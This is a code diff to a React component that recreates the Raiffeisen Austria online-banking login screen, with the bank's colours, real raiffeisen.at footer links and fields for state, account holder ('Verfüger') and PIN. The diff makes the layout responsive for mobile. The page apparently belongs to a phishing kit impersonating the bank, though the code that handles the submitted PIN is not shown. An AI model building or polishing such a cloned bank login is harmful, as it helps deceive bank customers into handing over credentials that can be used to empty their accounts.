@@ -83,17 +83,31 @@ const Raiffeisenbank = () => {
 
   return (
     <div
-      className="relative flex min-h-screen flex-col items-center justify-center"
-      style={{
-        fontFamily: "'Open Sans', sans-serif",
-        backgroundImage: `url(${bgImage})`,
-        backgroundSize: "cover",
-        backgroundPosition: "center",
-        backgroundAttachment: "fixed",
-      }}
+      className="relative flex min-h-screen flex-col"
+      style={{ fontFamily: "'Open Sans', sans-serif" }}
     >
+      {/* Mobile: Background image top section */}
+      <div
+        className="h-[40vh] w-full md:hidden"
+        style={{
+          backgroundImage: `url(${bgImage})`,
+          backgroundSize: "cover",
+          backgroundPosition: "center",
+        }}
+      />
+
+      {/* Desktop: Full background */}
+      <div
+        className="hidden md:flex md:fixed md:inset-0 md:items-center md:justify-center"
+        style={{
+          backgroundImage: `url(${bgImage})`,
+          backgroundSize: "cover",
+          backgroundPosition: "center",
+        }}
+      />
+
       {/* Login Card */}
-      <div className="relative z-10 w-full max-w-2xl rounded-sm bg-white p-10 shadow-lg">
+      <div className="relative z-10 w-full flex-1 bg-white p-6 md:flex-initial md:max-w-2xl md:rounded-sm md:shadow-lg md:p-10 md:mx-auto md:my-auto md:fixed md:top-1/2 md:left-1/2 md:-translate-x-1/2 md:-translate-y-1/2">
         {/* Language Switcher */}
         <div className="absolute right-4 top-4" ref={langRef}>
           <button
@@ -123,7 +137,7 @@ const Raiffeisenbank = () => {
           )}
         </div>
 
-        <h1 className="mb-4 text-3xl font-light text-[#1a1a1a]">
+        <h1 className="mt-10 md:mt-0 mb-4 text-3xl font-light text-[#1a1a1a]">
           {t.title}
         </h1>
         <p className="mb-8 text-base text-gray-500">
@@ -251,7 +265,7 @@ const Raiffeisenbank = () => {
         <div className="flex justify-center">
           <button
             type="button"
-            className="rounded-md bg-[#fbf315] px-32 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
+            className="w-full md:w-auto rounded-md bg-[#fbf315] px-8 md:px-32 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
             disabled={!bundesland || !verfueger || !pin}
           >
             {t.weiter}
@@ -260,10 +274,10 @@ const Raiffeisenbank = () => {
       </div>
 
       {/* Bottom shadow gradient */}
-      <div className="pointer-events-none fixed bottom-0 left-0 right-0 z-[9] h-32" style={{ background: "linear-gradient(to top, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0) 100%)" }} />
+      <div className="hidden md:block pointer-events-none fixed bottom-0 left-0 right-0 z-[9] h-32" style={{ background: "linear-gradient(to top, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0) 100%)" }} />
 
       {/* Footer */}
-      <footer className="fixed bottom-0 left-0 right-0 z-10 py-4">
+      <footer className="hidden md:fixed md:block bottom-0 left-0 right-0 z-10 py-4">
         <div className="flex flex-wrap items-center justify-center gap-4 text-xs text-white/90">
           <a href="https://raiffeisen.at/de/online-banking/login/impressum.html" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">{t.impressum} <ExternalLink className="h-3 w-3" /></a>
           <a href="https://raiffeisen.at/de/online-banking/login/nutzungsbedingungen.html" target="_blank" rel="noopener noreferrer" className="hover:underline inline-flex items-center gap-1">{t.nutzungsbedingungen} <ExternalLink className="h-3 w-3" /></a>
